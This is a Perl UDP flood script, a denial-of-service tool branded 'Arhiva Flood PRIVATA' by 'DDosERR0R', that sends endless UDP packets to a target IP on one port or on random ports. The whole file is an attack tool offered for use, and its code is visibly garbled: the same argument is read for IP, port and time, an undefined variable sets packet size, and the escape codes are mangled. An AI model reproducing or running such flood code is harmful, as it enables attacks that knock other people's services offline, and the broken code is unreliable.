
#!/usr/bin/perl
use Socket;
$ARGC=@ARGV;
my ($ip,$port,$size,$time);
$ip=$ARGV[0];
$port=$ARGV[0];
$time=$ARGV[0];
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$ip");

printf " [1;35m# [1;33m# [1;31m* [0;32m  
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz                                                                    
   [1;36m$ip n";
printf " [1;35m# [1;33m# [1;31m* [0;32m Arhiva Flood   [0;31mPRIVATA  [0m\n ";
printf " [1;35m# [1;33m# [1;31m* [0;32m By  [1;33DDosERR0R  [1;36m2017-2018  [0m\n";
printf " [1;35m# [1;33m# [1;31m* [0;32m UPDATE 2017 COPYRIGHT  [1;36mDDosERR0R [0;32m @  [1;33mip down  [0m\n";


if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &"); 
goto randpackets;
}
packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}
randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=(rand 65000) +1;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}
ddos
Displaying ddos.